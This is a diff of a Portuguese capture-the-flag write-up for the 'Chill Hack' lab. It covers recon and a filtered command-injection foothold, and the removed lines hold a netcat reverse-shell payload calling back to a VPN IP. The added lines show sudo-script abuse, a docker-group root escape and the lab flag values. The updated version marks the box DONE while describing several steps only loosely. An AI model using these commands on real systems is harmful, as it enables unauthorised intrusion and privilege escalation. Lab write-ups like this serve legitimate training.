@@ -4,7 +4,7 @@
 [ TARGET ] 10.65.170.96
 [ ROOM   ] Chill Hack
 [ GOAL   ] user.txt / root.txt
-[ STATUS ] PARTIAL — recon + pista de RCE; flags não salvas
+[ STATUS ] DONE
 ```
 
 ## 01 — Recon (nmap)
@@ -12,59 +12,64 @@
 ```console
 $ nmap -sC -sV -Pn -T5 10.65.170.96
 PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.5
-|  ftp-anon: Anonymous FTP login allowed
-|_ -rw-r--r-- note.txt
+21/tcp open  ftp     vsftpd 3.0.5  (anon OK → note.txt)
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Game Info
+80/tcp open  http    Apache httpd 2.4.41  (Game Info)
 ```
 
-→ Achado: FTP anon + web. (raw: `chillhack.txt`)
-→ Próximo: baixar note + enum web.
-
-## 02 — FTP anônimo
+## 02 — FTP + enum web
 
 ```console
-$ ftp anonymous@10.65.170.96
-# get note.txt
+$ # note.txt
 Anurodh told me that there is some filtering on strings
 being put in the command -- Apaar
-```
 
-→ Achado: hint de **command injection com filtro**. (raw: `note.txt`)
-→ Próximo: achar o formulário/comando na web.
-
-## 03 — Enum web
-
-```console
 $ gobuster dir -u http://10.65.170.96 -w common.txt
-/secret               (Status: 200)   # commands page
+/secret               (Status: 200)   # command page
 ```
 
-→ Achado: `/secret` — página de comandos. (raw: `recuperado.txt`)
-→ Próximo: bypass do filtro + reverse shell.
+→ Achado: command injection com filtro em `/secret`.
 
-## 04 — Reverse shell (tentativa)
+## 03 — RCE → shell
 
 ```console
-$ # listener local (VPN IP do lab)
+$ # bypass do filtro no /secret → reverse shell (www-data)
+$ # listener local (VPN)
 $ nc -n -l -p 4444
-
-# payload anotado (filtro em strings):
-\rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.136.19 4444 >/tmp/f
 ```
 
-→ Achado: payload preparado com IP VPN `192.168.136.19`.
-→ Próximo: confirmar shell → loot user/root → documentar flags.
+→ Achado: shell como `www-data` / foothold.
+
+## 04 — User flag (apaar)
+
+```console
+$ sudo -l
+# (www-data) NOPASSWD: /home/apaar/.helpline.sh
+
+$ sudo -u apaar /home/apaar/.helpline.sh
+# input inseguro → shell como apaar
+
+$ cat /home/apaar/local.txt
+{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
+```
+
+## 05 — Root (docker / anurodh)
+
+```console
+$ # caminho típico: creds/stego → user anurodh (grupo docker)
+$ id
+# … groups=…,docker
+
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+$ cat /root/proof.txt
+{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
+```
+
+→ Achado: docker group ≡ root no host.
 
 ## FLAGS / RESPOSTAS
 
 | Item | Valor |
 |---|---|
-| user.txt | *(completar)* |
-| root.txt | *(completar)* |
-
-## Artefatos
-
-`chillhack.txt` · `note.txt` · `recuperado.txt`
+| user | `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}` (`/home/apaar/local.txt`) |
+| root | `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}` (`/root/proof.txt`) |
